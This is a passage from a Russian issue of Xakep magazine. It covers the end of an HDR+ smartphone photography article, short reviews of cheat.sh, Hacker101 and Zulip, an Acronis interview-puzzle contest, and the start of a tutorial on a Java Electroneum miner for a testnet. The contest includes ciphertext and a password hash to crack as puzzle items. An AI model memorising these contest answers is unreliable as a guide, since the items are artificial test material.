в тени нужно осветить, тем больше кадров выполняет смартфон.
   Когда серия снимков будет сделана, она объединяется в один снимок. Тут
выручает заниженная выдержка, благода ря которой каждая фотография
в серии выглядит отно ситель но чет ко. Из трех первых кадров выбирается
самый приемле мый в плане как рез кости, так и детализации для исполь‐
зования в качестве основы. Затем полученные снимки разделяются на фраг‐
менты и система проверя ет, можно ли совместить соседние фрагменты и как
это сделать. Обнаружив лишние предметы в одном из фрагментов, алгоритм
удаляет этот фрагмент и выбирает похожий с дру гого кадра. Полученные
снимки обрабатываются с помощью специального алгоритма, основанного
на методе удач ных экспо зиций (в основном он применяется в астрофотог‐
рафии для уменьшения размытости изоб ражений, вызванной мерцающей
атмосферой Зем ли).
  Далее в дело вступает сложная система подавления шумов, которая вклю‐
чает в себя как простой метод усреднения цвета пикселей на основе нес‐
кольких снимков, так и систему предсказания появления шумов. Алгоритм
работает очень мягко на гра ницах переходов тональ ностей, чтобы миними‐
зировать потерю детализации, пусть даже и ценой наличия небольшого
количества шума в таких мес тах. А вот на участках с равномерной текстурой
«шумодав» выравнивает картинку вплоть до почти иде ально равномерного
тона с сохранением перехо да оттенков.





  Работа шумодава в сложных усло виях. Слева до обработки, а справа —
  после

(Изображение в исходном качестве )

  А как же расширение динамичес кого диапазона? Как мы уже знаем,
использование короткой выдержки избавляет нас от пересвеченных мест.
Осталось только удалить шумы на темном учас тке ранее описанным алгорит‐
мом.
  На завершающем этапе выполняется постобра ботка полученного изоб‐
ражения: алгоритм дела ет минимизацию винь етирования, обусловленного
попаданием света на матрицу под наклонным углом, корректирует хромати‐
ческую аберрацию заменой пикселей у высоко контрастных краев на сосед‐
ние, увеличивает насыщенность зелени, синие и пурпурные оттенки сме щает
в сторону голубого, усиливает рез кость (шарпинг) и выполняет ряд других
шагов, повышающих качество фотографии.





  Иллюстрация работы кон вейерного алгоритма HDR+ из доклада раз‐
  работчиков

Слева фотография из стоковой камеры Samsung в HDR, а справа фотог‐
рафия, созданная в Gcam в HDR+. Видно, что алгоритм принес в жертву
детализацию неба для прорисовки объектов на земле.





(Изображение в исходном качестве )





(Изображение в исходном качестве )



Об новле ние HDR+ в Google Pixel
В Google Pixel алгоритм претерпел существенные изменения. Теперь смар‐
тфон начинает снимать сразу после запус ка камеры и в зависимос ти от сте‐
пени освещения делает от 15 до 30 кадров в секунду. Эта технология называ‐
ется ZSL (Zero Shutting Lag) и была придума на для того, чтобы делать момен‐
тальные снимки. Но Pixel использует ее для работы HDR+: при нажатии
на кнопку спуска смар тфон выбира ет от 2 до 10 кадров из буфера ZSL (в
зависимости от условий освещения и наличия движущихся объ ектов). Затем
из первых двух‐трех кадров выбирается лучший, а остальные, как и в пре‐
дыдущей версии алгоритма, сло ями накладыва ются на основной.
  Наряду с этим появилось разделение на два режима: HDR+ Auto и HDR+.
Последний берет максимально большое количес тво снимков для соз дания
итоговой фотографии. Она получается более сочной и яркой.
  HDR+ Auto делает меньше фотографий, благодаря чему движущиеся объ‐
екты становятся менее раз мытыми, влияние тряс ки рук ниже, а фотография
готова практически мгновенно пос ле нажатия на кноп ку съемки.
  В версии Google Камеры для Pixel 2/2XL режим HDR+ Auto был переиме‐
нован в HDR+ On, а HDR+ стал называть ся HDR+ Enhanced.
  Во втором поколе нии Google Pixel появился специальный сопроцессор,
называемый Pixel Visual Core. В нас тоящее время чип применяется только
для ускоренной обработки фотографий в режиме HDR+, а также предос‐
тавляет сторонним приложениям возможность выпол нять снимки в HDR+.
На  качестве  фотографий,  сделанных  Google  Камерой,  его  наличие
или отсутствие никак не ска зывается.


             INFO

                       Google использует HDR+ даже для устра нения
                      проблем с железом. Из‐за конструк тивной ошиб‐
                        ки Google Pixel / Pixel XL мог сделать фотографию
                        с сильным засветом. Google выпустила обновле‐
                         ние, которое использует HDR+, что бы убрать этот
                        засвет, комбинируя снимки.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

    ИДЕАЛЬНОЕ ФОТО
           ЧТО ТАКОЕ HDR+ И КАК АКТИВИРОВАТЬ ЕГО
                         НА СВОЕМ СМАРТФОНЕ





Пре иму щества и недостатки
Выделим основные достоинс тва HDR+:
 • Алгоритм замечательно устраняет шумы с фотографий, практически
   не искажая детали.
 • Цвета в темных сюжетах гораз до насыщеннее, чем при однокадровой
  съемке.
 • Движущиеся объекты на снимках реже двоятся, чем при съемке в режиме
  HDR.
 • Даже при создании кадра в усло виях недос таточной освещенности веро‐
   ятность смазывания картинки из‐за дро жания камеры сведена к миниму‐
   му.
 • Динамический диапа зон шире, чем без использования HDR+.
 • Цветопе редача  преиму щественно   получа ется   естественней,  чем
   при однокадровой съемке (не для всех смартфо нов), особенно по углам
  снимка.

На ниже размещенных иллюстрациях слева расположена фотография со сто‐
ковой камеры Galaxy S7, а в правой час ти — фото в HDR+ через Google
Камеру на том же устройстве.
  Ночные фотографии города. Тут прекрасно видно, что HDR+ дает нам воз‐
можность получить отчетливое изоб ражение группы граждан, расположив‐
шихся под вывеской Билайн. Небо выг лядит чисто, дорожный знак отчетливо.
Трава, как и должна быть, зеленая. Вывеска Билайн с правильной передачей
цветов. Отчетливая прорисовка балконов, проводов и крон деревьев. Важ‐
но — проработка деталей на деревьях справа (в тени) у HDR+ несколько
хуже, чем у стоковой камеры.





(Изображение в исходном качестве )





(Изображение в исходном качестве )





(Изображение в исходном качестве )

  Обрати внимание на прорисовку лиц скульптур, сочность красок одежды,
отсутствие критичных шумов. Одна ко прорисовка объ ектов в тени опять
оставляет желать лучшего.





(Изображение в исходном качестве )





(Изображение в исходном качестве )





(Изображение в исходном качестве )

   Городская окраина. Тус кло го света фонарей дос таточно для прорисовки
HDR+ поверхности стены здания.





(Изображение в исходном качестве )





(Изображение в исходном качестве )





(Изображение в исходном качестве )

   Утренние фотографии. В сложных условиях утренней съемки при ярко
выраженном контровом свете цвета выглядят естественно, рисунок на ство‐
лах деревьев отчетлив, изображение куста и травы в тени дерева прос матри‐
вается в глубину.





(Изображение в исходном качестве )





(Изображение в исходном качестве )





(Изображение в исходном качестве )

  Недостатков у HDR+ мало, да и носят они несущественный характер
для большинства сюжетов. Во‐первых, для соз дания HDR+ фотографии тре‐
буется много ресурсов про цес сора и оперативной памяти, что приводит
к ряду негативных последс твий:
 • повышается расход акку мулятора, и устрой ство греется при объеди нении
   серии снимков;
 • нельзя быстро сделать нес колько снимков;
 • мгновенный предпрос мотр недос тупен; фотография появится в галерее
   после  окон чания  обработки,  которая  на  Snapdragon  810  длится
   до четырех секунд.

Частично эти проб лемы уже решены с помощью Pixel Visual Core. Но этот соп‐
роцессор, скорее всего, так и останется козырем Google Pixel.
   Во‐вторых, для работы алго ритму необходимо как минимум две фотог‐
рафии, а в среднем про исходит захват четырех‐пяти кадров. Поэтому:
 • обязательно возникнут ситуации, в которых алгоритмы будут давать сбои;
 • HDR+ немного проигрывает клас сичес кому HDR по охвату динамического
   диапазона;
 • создание одной фотографии и ее обра ботка с использованием быстрого
   ISP‐сопроцессора будет предпочтительнее в экшен‐сценах, потому что
   позволяет избе жать двоения и сма зывания объектов при невысокой
   выдержке.





           Недостатки HDR+ из доклада его разработчиков





        Ночная фотог рафия с множеством движущихся объектов

(Изображение в исходном качестве )



НА КАКИХ УСТРОЙСТВАХ РАБОТАЕТ HDR+
Чисто теоретически HDR+ может работать на любом смартфоне с версией
Android не ниже 5.0 (необ ходим Camera2 API). Но по соображениям мар‐
кетинга, а также из‐за наличия некоторых оптимиза ций, тре бующих специаль‐
ных железных компонентов (сопроцессор Hexagon в Snapdragon), Google
намеренно заблокировала включение HDR+ на любом устройстве, кроме Pix‐
el. Однако Android не был бы Android’ом, если бы энтузиас ты не нашли способ
обойти это ограничение.
  В августе 2017 года один из пользователей 4PDA сумел модифицировать
приложение Google Camera таким образом, чтобы режим HDR+ можно было
использовать на любом смартфоне с сигнальным процессором Hexagon
680+ (Snapdragon 820+) и включенным Camera2 API. Первое вре мя мод
не поддерживал ZSL, да и в целом выг лядел сыро. Но и этого было достаточ‐
но, чтобы улучшить качес тво фотосъ емки смартфонов Xiaomi Mi5S, OnePlus
3 и прочих до ранее недос тижимо го для них уровня, а HTC U11 так и вовсе
получил возможность на равных соревноваться с Google Pixel.
  Позже к адап тации Google Camera на телефоны сторонних вендоров под‐
клю чились другие разработ чики. Спус тя некоторое время HDR+ заработал
даже на устройствах со Snapdragon 808 и 810. На сегод няшний день прак‐
тически для каждого смартфо на, основанного на Snapdragon ARMv8, работа‐
ющего на Android 7+ (в некоторых слу чаях и Android 6) и имеющего воз‐
можность использовать Camera2  API, существу ет портированная версия
Google Camera. Частенько она поддерживается отдельным энтузиастом,
но обычно таких разработчиков сразу нес колько.
  В начале января 2018‐го пользователь XDA miniuser123 сумел запус тить
Google Camera с HDR+ на своем Galaxy S7 с процессором Exynos. Немного
позже выяснилось, что Google Camera работала также на Galaxy S8 и Note 8.
Первые версии для Exynos были нес табильны, час то падали и зависали, в них
не работала оптическая стабилизация изоб ражения и ZSL. Версия 3.3 уже
достаточно  стабильна,  поддерживает  оптическую  стабилизацию  изоб‐
ражения и ZSL и все функции Google Camera, за исключением портретного
режима. А в число поддерживаемых устройств теперь входят несколько смар‐
тфонов Samsung серии A.


КАК ПОЛУЧИТЬ HDR+ НА СВОЕМ УСТРОЙСТВЕ
Если у тебя смартфон на Exynos, то выбор невелик. Переходи в тему обсужде‐
ния на XDA, открывай спой лер V8.3b Base (если у тебя Android 8) или Pixe2‐
Mod Base (для Android 7) и качай пос леднюю версию. Также можешь посетить
группу в Telegram, где оперативно выкладыва ют все обновления Google
Камеры.
  Владельцам смартфонов с процес сом Qualcomm при дется поис кать.
Энтузиасты активно поддерживают версии Google Camera с HDR+ для мно‐
жества смартфонов. Приведу наиболее извес тные модели:
 • OnePlus 3/3t;
 • OnePlus 5/5t;
 • OnePlus 6;
 • Xiaomi Mi Max2;
 • Xiaomi Redmi 4x;
 • Xiaomi Redmi 5 Plus.

Если в списке нет твоей модели, рекомендую прогуляться по темам обсужде‐
ния камеры и самого устройства на 4PDA и XDA. Как минимум там будут поль‐
зователи, пытав шиеся запустить HDR+.
  Ко всему вышесказанному упомяну, что в интернете есть страница, где
собраны практически все вер сии Google Camera, на которой удоб но тес‐
тировать различные Gcam на мало извес тных устройствах.


ЗАКЛЮЧЕНИЕ
Алгоритм HDR+ служит яркой демонс трацией возможностей мобильной циф‐
ровой фотографии. Пожалуй, на сегодняшний день это самый эффективный
из доступных алгоритмов обработки изоб ражений. HDR+ достаточно одного
фотомодуля для создания снимка, по качеству обходяще го двойные фотомо‐
дули некоторых гаджетов.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



       CHEAT.SH — УДОБНЫЕ ПОДСКАЗКИ ПО КОМАНДАМ И
     ЯЗЫКАМ В ТЕРМИНАЛЕ1       Чего только не придума ет человек, чтобы не запоминать параметры
          к tar, wget, dd и другим замечательным, но не впол не очевидным
        командам! Например, мы как‐то писали про TLDR pages — замену
        man, где объяснение каждой команды укладывается все го в нес‐
        колько строк. Однако cheat.sh превос ходит его на две головы.
           Cheat.sh — это онлайновый сервис, к которому можно обращать‐
        ся из командной строки и искать по внушительной коллекции
        из чит‐шитов, соб ранных силами сооб щес тва. Сюда входит около
        тысячи команд Unix/Linux и 55 языков программирования. А если
        этого окажется недос таточно, то в дело пойдет наш любимый Stack
        Overﬂow.





       Но самое классное — что устанавливать на компьютер ничего
        не потребуется. Дос таточно просто сделать запрос при помощи
           curl. Например, curl cheat.sh/tar выдаст наиболее час тые вари‐
        анты использования tar с коммента риями. Чтобы печатать еще на
        две буквы меньше, предлагается использовать короткий URL cht.sh.





        Если ты не знаешь, что точно ищешь, добавь в начале запроса тиль‐
          ду, и cheat.sh поищет по описаниям команд. А если тебя интересу ет
        справка по языкам программирования, то укажи язык через слеш
        и тему, которая тебя интересует. Например, curl cht.sh/python/
        lambda.
        В том случае, если подходящий чит‐шит не будет найден, сервис
        попытается сгенерировать его на лету из доступной информации (в
        основном со Stack Overﬂow). Так что можешь сме ло писать что‐то
        вроде  curl   cht.sh/python/random+string,   чтобы   узнать,
         как генерировать случайные строки в Python. Если результат тебя
        не порадует, можно в конце добавить /2, /3 и так далее, чтобы
        получить следующие. Правда, сейчас cheat.sh в таких случаях иногда
       вместо того, чтобы выдать ответ, жалуется на высокую нагрузку
        и просит подождать.





       Еще существуют специальные команды. Например, :list покажет,
        какие разделы справки дос тупны, а для язы ков программи рования
       можно написать :learn и в ответ получить ценную выжимку в стиле
         «изучи новый язык за 15 минут».
          Если cheat.sh придется тебе по вкусу, то ты можешь скачать
        и использовать интерактивную оболочку, плагин для vim или emacs
        или даже запустить клиент cheat.sh в «стелс‐режиме», когда он
        отсле живает буфер обмена «Иксов» и тихонько выдает подсказки
        в терминале.
          Ну а если предпочита ешь все же работать с графичес ким
        интерфейсом, то, возможно, тебе приглянется браузер докумен‐
        тации DevDocs, о котором мы писали в прошлом году.


      HACKER101 — БЕСПЛАТНЫЙ ВИДЕОКУРС ПО ВЗЛОМУ,
      СДЕЛАННЫЙ В HACKERONE2        HackerOne — крупнейшая платформа для координации поис ков уяз‐
       вимостей и выплаты багбаунти. Впрочем, если ты не слышал
        про HackerOne, то этот недлинный видеокурс, составленный его
        сотрудниками, как раз для тебя. Тех, кто ладит с английским, он все‐
         го за пол тора часа обучит азам хакерского мастерства.





        Курс доступен на YouTube в виде плей‐листа — включаешь и слу‐
       шаешь про XSS, раз ного рода инъекции, кликджекинг и прочие инте‐
        реснейшие вещи.





        Как вариант, можешь начать со страницы курса на GitHub. Там обри‐
        сован альтернативный путь прос мотра для тех, кто хочет только
        выборочно восполнить пробелы в сво ем образовании (тогда смотри
         второй список). А в самом низу стра ницы ты найдешь ссылки
        на интерактивные соп роводительные материалы. Точнее, поднятые
        на App Engine стенды, на которых можно оттачивать полученные
        навыки.


       ZULIP — ОПЕНСОРСНАЯ ЗАМЕНА ДЛЯ SLACK И ДРУГИХ
      ГРУППОВЫХ ЧАТОВ3        Разработчики Slack четыре года назад практически заново откры ли
        миру чаты. В какой‐то момент это приложение для скорос тной
        рабочей переписки стали ставить повсюду — редакция «Хакера»,
         кстати, тоже не удержалась. Но Slack проприетарный, а при серь‐
       езном исполь зовании еще и стоит денег. Если твою компанию
        это останавлива ет от внедрения полезной новинки, то Zulip может
         стать неплохой альтернативой.
          Чтобы посмотреть на Zulip вживую, можешь заглянуть в чат его
        разработчиков: он находится по адресу chat.zulip.org. Если ты уже
       имел дело со Slack, то сразу почувству ешь себя как дома: каналы,
         боты, разговоры картинками, смай ликами и вставками из красиво
       оформлен ного кода (используется син таксис Markdown).





      Однако чат в Zulip гораздо менее хаотичный, чем в Slack. Он делится
        не только по каналам: для начала новой беседы нужно соз дать
         топик. Любой из них при желании можно замьютить, чтобы раз говор,
        в котором ты не собираешься участво вать, не отвлекал от более
        важных дел.
           Как и у Slack, у Zulip есть приложения для всех основных плат‐
       форм, вклю чая iOS и Android. Место для развертывания сервера
       можешь выбрать сам, но учти, что рекомендуется ставить Debian
        или Ubuntu. Как вариант — дос тупен сервис, который предос тавля‐
       ют разработчики. Ограничения на бесплатные аккаунты и цены
        на платные — примерно такие же, как у Slack.
          Ну а если открытые исходни ки и свобода софта тебе и твоей ком‐
        пании не так важны, то Microsoft недавно выкатила бесплатную вер‐
       сию Teams с неог раниченным поиском, дву мя гигабайтами мес та
        на пользователя и очень демократичным ограничением на 300 юзе‐
         ров.
HEADER
 ЗАДАЧИ
   НА СОБЕСЕДОВАНИЯХ





   ЗАДАНИЯ ДЛЯ ХАРДКОРЩИКОВ
     ОТ КОМПАНИИ ACRONIS




Приятно  осознавать,  что  среди  наших
читателей много настоящих хакеров, спо‐
собных дать решительный бой повсемес‐
тному засилью сделан ных на двухнедель‐
ных  онлайн‐курсах  веб‐программистов.       Александр Лозовский                                                                                                    lozovsky@glc.ru
Список победителей  предыдущих  задач
это  подтверждает.  Поэтому  за новыми
задачами мы обратились к компании, «низ‐
коуровневая»  ориентация  специалистов
которой не вызывает сомнений, — Acronis!


УСЛОВИЯ КОНКУРСА
Всего будет четыре задачи. Первые три — легкие, за правильное решение
которых начисляется по 5 баллов за каж дую. Четвертая — нас тоящий жес ткач,
и стоит она 15 баллов. Победитель определя ется по двум показателям:
количество баллов + скорость выполнения заданий. Проще говоря, первые,
кто качественнее всего справят ся с решением, получают призы.
  Десять победителей получают 10 дополнительных бал лов к пос туплению
в магистратуру Computer Science, организованную компаниями Acronis и Jet‐
Brains, и годовую лицензию Acronis True Image 2018. Также трем первым учас‐
тникам, приславшим пра вильные ответы, мы дополнительно подарим:
 1. power bank;
 2. наушники;
 3. кружку Acronis.

Выпол нять задания нужно вот здесь. Необ ходимо будет пройти по ссылке,
записать ход решения и дать конечный ответ.


ЗАДАЧА № 1 (РАЗМИНКА). 5 БАЛЛОВ
С помощью одного очень популярного шифра мы зашифровали совет,
который даем всем друзьям! Вам необходимо угадать шифр, расшифровать
фразу и воспользоваться советом. Так как пос ледний пункт мы не сможем
проверить, оставим его на вашей совес ти. :)


Jiks cx bw bpm ncbczm!


ЗАДАЧА № 2. 5 БАЛЛОВ
В задачах шифрования и обеспечения сетевой безопас ности используют
особые алгорит мы, которые генерируют последовательность чисел. Очевид‐
но, что эта последовательность не является «абсо лютно случайной». Если
выбрать хороший алго ритм, наша числовая пос ледовательность будет про‐
ходить большинство тестов на случайность. Такие пос ледовательнос ти обыч‐
но называют псевдослучайными.
  Один из стан дартных алгорит мов генера ции псевдослучайных чисел —
линейный кон гру энтный метод (ЛКМ). Он не обладает особой крип‐
тографической стой костью, поэтому применяется в прос тых слу чаях. Линей‐
ный конгруэнтный метод заключа ется в вычис лении эле ментов линейной
рекуррентной последовательнос ти по модулю некоторого натурального чис‐
ла m, которые можно пос читать по формуле (1), где n > 0, a и c — некоторые
целочисленные коэф фициенты. Получаемая пос ледовательность зависит
от выбора стартового числа X0, и при раз ных его значениях получаются раз‐
личные последовательнос ти псевдослучайных чисел.
  Значения X0, a, c, m называют параметрами генератора. Они полностью
определяют результат его работы. Мы решили немного изменить метод
и вместо умножения Xn на константу использовать возведение константы
в степень Xn. Теперь пос читать n+1 член последовательнос ти можно по фор‐
муле (2).





Как мы уже сказали, существенным недостатком метода ЛКМ является пред‐
сказуемость его членов, но! Именно это дает возможность решить задачку.
  Необходимо предсказать следующие пять значений нашей последова‐
тельности. Первые члены: Х1 = 27, Х2 = 54, Х3 = 29, Х4 = 30.
  Подсказка: a^X0 = c.


ЗАДАЧА № 3. 5 БАЛЛОВ
Вы наверняка знаете, что хеширование — это преобразование входного мас‐
сива данных произволь ной длины в выходную битовую строку фиксированной
длины, которое, как правило, используется для сравнения данных. Также
хеш‐коды используются для хра нения паролей, так как записы вать исходный
пароль где‐либо очень ненадежно.
  Мы решили пойти даль ше и сделать нес колько опе раций хеширования
одного пароля подряд, чтобы было еще надежнее хранить (шутка). Исходный
пароль — стандартный восьмизначный пароль для Windows (регистр учитыва‐
ется). Решением данной задачи будет пра виль ный алгоритм и количество
операций хеширования, а также исходный пароль. Удачи!


fac3377a2f9356a6b1927ba015fcc8cb


ЗАДАЧА № 4. СЛОЖНАЯ. 15 БАЛЛОВ!
Пользователь хранит свои файлы в облаке. Каж дый раз, добавляя или стирая
файл, извлекая его или загружая новую версию, он хочет убедиться, что меж‐
ду обращениями файлы никто не трогал. Для этого пользователь хранит
некоторые хеш‐значения от данных. Рас смот рим два крайних слу чая:
 • Пользователь хранит хеш‐значение от всего массива данных, каждый раз
   скачивает весь массив и сравнивает хеши. В этом случае на стороне поль‐
   зователя хранится совсем немного, зато во время проверки пересылается
   очень много данных, а сама проверка идет долго.
 • Пользователь хранит хеш‐значение от каждого файла, каждый раз ска‐
   чивает только нужный файл и сравнивает хеши. В этом слу чае на стороне
   пользователя хранится линейный от числа файлов мас сив данных, но вре‐
  мя проверки и объем пересланных данных совсем маленькие.

Придумайте систему, при которой и массив данных, хранящихся у поль‐
зователя, и время проверки, и объем пересылаемых данных менее, чем
линейны. Опишите протокол про верки, что ничего не изменялось, и протокол
обновления данных.


IT-ком пании, шли те нам свои задач ки!
Миссия этой мини‐рубрики — образовательная, поэтому мы бесплатно пуб‐
ликуем качественные задачки, которые различные компании предлагают
соискателям. Вы шлете задачки на lozovsky@glc.ru — мы их публику ем.
Никаких актов, договоров, экспертиз и отчетностей. Читателям — задачки,
решателям — подарки, вам — рес пект от нашей многосоттысячной ауди‐
тории, пиарщикам — строчки отчетнос ти по публикациям в топовом компь‐
ютерном журнале
КОДИНГ

 ПИШЕМ МАЙНЕР
  НА JAVA





                                        gogaworm
                                            Автор рубрики КОДИНГ
                                              журнала «Хакер»
                                              gogaworm@tut.by




         КОДИМ ДОБЫТЧИК
    КРИПТОВАЛЮТЫ ELECTRONEUM





В наше время каж дая бабушка слышала о криптовалютах,
курсы майнинга проводят даже серьезные учебные заведе‐
ния, а антивирусы все чаще кричат о заражении сайта
или игрушки майнером. Пришло время на практике разоб‐
раться, что это такое, как работает, и написать свой крип‐
томайнер.


В качестве криптовалюты возьмем Electroneum. Это довольно перспективная
криптовалюта  из семейства  Monero.  Как  заверя ют  разработчики, она
защищена от майнин га на специальном оборудовании, точнее, оборудо‐
вание будет стоить больше, чем можно получить прибыли. Это дает примерно
равные шансы всем майнерам. Так как в качестве основы была использована
Monero, многое из написанного будет правдиво и для дру гих криптовалют
этого семейства.


             INFO

                     Заодно рекомендуем ознакомиться со статьей
                            «Mining Pool на Java: кодим распределенный бит‐
                       койн‐майнер».


Для начала разберемся, что же такое майнинг. По сути это проверка тран‐
закций различных пользователей крип товалют. Нет никакого центрального
органа, а подтвердить, что один участник сети не использовал свои деньги
дважды или не попытал ся как‐то еще обмануть сис тему, могут все остальные.
За это майнеры получа ют награду в виде неболь шого количества крип‐
тоденег. В эту сумму входит награда за создание нового блока и оплата
за транзакции, которая взимается с пользователей, проводящих транзакцию,
и уже включена в нее.
  Создание нового блока представляет собой решение определенной
математической задачи. Необходимо най ти такой хеш блока, который был бы
меньше значения, определяемого сетью. Это зна чение называется слож‐
ность (diﬃculty). Оно регулируется сетью, чтобы время создания блока было
более‐менее предсказуемо. Майнер, который первый решит задачу, получа‐
ет всю награду. Награда за блок на сегодняшний день составляет 11 300,93
ETN, что примерно равно 146,2 доллара.
  В блоке не обязательно должны быть транзакции других пользователей,
может быть только одна транзакция соз дания новых денег. Зачем нужно
просто раздавать день ги? Во‐первых, это привлекает больше учас тников
сети, во‐вторых, снижает риск атаки на сеть, так как заработать легально
получается проще.
   Чтобы стать участником сети Electroneum, необходимо скачать пакет прог‐
рамм с официального сайта. Выбира ем direct miner для своей платформы.
После скачивания и распаковки нужно син хронизи роваться с сетью — ска‐
чать все уже сге нерированные блоки. Для разработки и тестирования лучше
пользоваться тестовой сетью с понижен ной слож ностью.
  К сожалению, синхро низация «из короб ки» может завис нуть на бло‐
ке 155750. Это связано с найденным критичным багом и кардинальными
изменениями из‐за этого в сети Electroneum (подробнее). Поэтому прежде
чем запускать синхрониза цию, нужно скачать файлик с правильной цепочкой
блоков и положить его в папку .electroneum/testnet/export/blockchain.
raw. Затем выпол нить импорт:


> ./electroneum‐blockchain‐import ‐‐testnet ‐‐verify 0

Теперь сме ло запускаем син хрониза цию:


> ./electroneumd ‐‐testnet

Далее создаем кошелек для начисления заработка:


> electoneum‐wallet‐cli ‐‐testnet

Ответив на все вопросы, получаем пуб личный адрес в файлике <название
кошелька>.address.txt. Если лениво заморачиваться с развертыванием
сервера  Electroneum, мож но воспользоваться онлайн‐сервисом nodes.
hashvault.pro:26968.
  Настало время запустить свой любимый редактор и прис тупать к кодиро‐
ванию. Для связи с сервисом Electroneum используется протокол jsonrpc.
Нам понадобится всего две команды: получить шаблон блока и отправить
решение. Начнем с простого HTTP‐клиента:


public String sendRpcCommand(String command) {
  // Определяем URL для связи с сервером. Для реальной, не тестовой
сети порт будет 26968
  URL url = new URL("http://127.0.0.1:34568/json_rpc");
  HttpURLConnection con = (HttpURLConnection) url.openConnection();
  // Задаем параметры соединения. Разрешаем вывод, чтобы забрать
ответ сервера
  con.setDoOutput(true);
  // Передавать будем данные в формате JSON
  con.setRequestProperty("Content‐Type", "application/json;
charset=UTF‐8");
  con.setRequestProperty("Accept", "application/json");
  con.setRequestMethod("POST");
  // Отправляем команду
  OutputStream os = con.getOutputStream();
  os.write(command.getBytes("UTF‐8"));
  os.close();
  StringBuilder sb = new StringBuilder();
  int HttpResult = con.getResponseCode();
  if (HttpResult == HttpURLConnection.HTTP_OK) {
    // Если соединение успешно, то забираем ответ сервера
    BufferedReader br = new BufferedReader(new InputStreamReader(con.
getInputStream(), "utf‐8"));
    String line;
    while ((line = br.readLine()) != null) {
      sb.append(line).append("\n");
    }
    br.close();
    return sb.toString();
  } else {
    // Если соединение не удалось, то бросаем исключение с описанием
проблемы
    throw new IOException(con.getResponseMessage());
  }
}

Чтобы получить шаблон блока для вычисления, отпра вим команду


{
  "jsonrpc":"2.0",
  "id":"0",
  "method":"get_block_template",
  "params":{
    "wallet_address":"44GBHzv6ZyQdJkjqZje6KLZ3xSyN1hBSFAnLP6EAqJ
tCRVzMzZmeXTC2AHKDS9aEDTRKmo6a6o9r9j86pYfhCWDkKjbtcns",
    "reserve_size":8
  }
}

В качестве параметра wallet_address указыва ем адрес из файла <название
кошелька>.address.txt. Адрес используется, чтобы сразу сгенерировать
транзакцию получения награды за расчет блока. Параметр reserve_size
задает, сколько выделить зарезервированных бай тов, которые потом можно
использовать при майнинге. Максимальное чис ло — 255 байт.
  В результате получаем:


{
  "id": "0",
  "jsonrpc": "2.0",
  "result": {
    "blockhashing_blob": "070784e5dbda054486739aac8830906e18272012b9
7b98993afccf89d0044241193d1788f760cb0000000057754af7e8324054869
263b355ede600c2381cbdf6acf2dc8f2b26f4a9a82bae14",
    "blocktemplate_blob": "070784e5dbda054486739aac8830906e18272012b9
7b98993afccf89d0044241193d1788f760cb000000000183d71401fff1d6140
1eff844020117b5d2cead5bd512ab4b0a2e73377049c49c69ffc916687e811b
bb0f5f65322b01d67fec53c3f1cab976537a4ab4ebba03c89849d554963df6e
d1a0023e6d5d9e90208000000000000000013d5c0b347172631f9b017536593
6f98b00198d8caf3dbb77edc6c002dbb6c302776e7d543da92fdf5c30e91d4b
21762eb6fe5daf8959b519f3de65a3cd80adda1e5674fedeb2a5038577ea2fe
9eb6a3fd2162a3a09cbe6d3b62c9b04a29d47c5c14c119f0812448ab4e14a76
f1c2ddc2ff6ac0b97f1fb9e4cabf0ef2adf79221a3e865b8d9252f41f31e110
326b78b0c506e9f18eb094305b6216221c2bd3f9d996bedf54dbb4c0bfe4fea
6f2240181c91789270a48cae44d7662e1a13aae45c3edc3247736879f6aa267
0b8816e551856b912f11269979fac1c97203365247eaee476ed815e3fa597b5
230db7e0162816b55b23d2bfb8b9506492e8359f8ba33807eab0972a7837893
163cadf314888dbb64190fa00553156dc7b05574eacd3b9a268666201ab202b
23ecf960565c01a6a61fe5f03ba5b6c22d7e6639e7708941c876ecdc191cec4
c5797e520855d9cc34ef9c3866ded9a4722c6437363bb7a47c9dbd303c15a18
dfb72028054cd438924978f5c5d32be3bcbc622e0fb4b9aef865fea52a09f51
8952ec0aa94bbfa969f192a93b80a50fe7af2728cbd76e739e9af80aee2644f
b2bbe1c82724bdc4678a5a206a945a3e49dabcb10ae0f25d473aa76e0275c4f
9fa1cffc3e1d8748278561b99953966606a5d891717b4fb0366a77e38db4c26
7c3724e994532ae97fc7b12842157d8a11bc97926eb9978c82a07afc573a046
60247a94c5c4f14556fbcc9aa367b7bef4fdf18b626b4342d4e84850f133076
dcd26c16d3efe9f85fa29c757acda5dff2fe26fbf87d937be455d4053e4246a
3055ace5fcb6d6545aa3cd0b2e21ea3648f0dd6cde386933381b7116",
    "difficulty": 237219196877,
    "expected_reward": 1129583,
    "height": 338801,
    "prev_hash": "4486739aac8830906e18272012b97b98993afccf89d00442411
93d1788f760cb",
    "reserved_offset": 126,
    "status": "OK"
  }
}

Рассмотрим подробнее первые два поля.





                  Описание blockhashing_blob





                  Описание blocktemplate_blob

Electroneum пре доставляет две возможности для майнинга. Можно исполь‐
зовать готовый для расчета хеша blockhashing_blob, подбирая четыре байта
nonce. Из достоинств — не нужно рас счи тывать самому корень Меркле
для транзакций. Из недостатков — довольно скудный набор возможных зна‐
чений, среди которых может и не найтись нужного.
   Второй вариант — использовать сырой блок blocktemplate_blob. Тут уже
можно перебирать как четыре байта nonce, так и значение блока допол‐
нительных данных, что замет но рас ширяет вероятность нахождения нужного
значения. Но приходится считать хеш первой транзакции и корень Меркле,
а только потом рассчитывать хеш самого блока.
  Для начала попробу ем первый вариант. Напишем небольшой метод,
который будет перебирать значения nonce.


public static boolean findProperNonce(byte[] blockheader, int nonceB
yteIndex, long difficulty) {
  byte nonceByte = Byte.MIN_VALUE;
  while (nonceByte != Byte.MAX_VALUE) {
    blockheader[39 + nonceByteIndex] = nonceByte;
    if (nonceByteIndex < 3) {
      boolean found = findProperNonce(blockheader, nonceByteIndex + 1
, difficulty);
      if (found) {
        return true;
      }
    } else {
      byte[] hash = calculateHash(blockheader);
      if (hasRequiredDifficulty(hash, difficulty)) return true;
    }
    nonceByte++;
  }
  return false;
}

Electroneum использует алго ритм хеширования CryptoNight. Описание алго‐
ритма можно посмотреть тут. Хорошая новость — есть много готовых реали‐
заций, плохая — практичес ки все они написаны на С. К счастью, Java‐машина
прекрасно умеет запускать код на С. Поэтому, чтобы сократить время, возь‐
мем готовую реализацию алго ритма и сделаем для нашего майнера под клю‐
чаемую DLL’ку.
  Для этого нам понадобится Cygwin. Это набор опенсорсных линуксовых
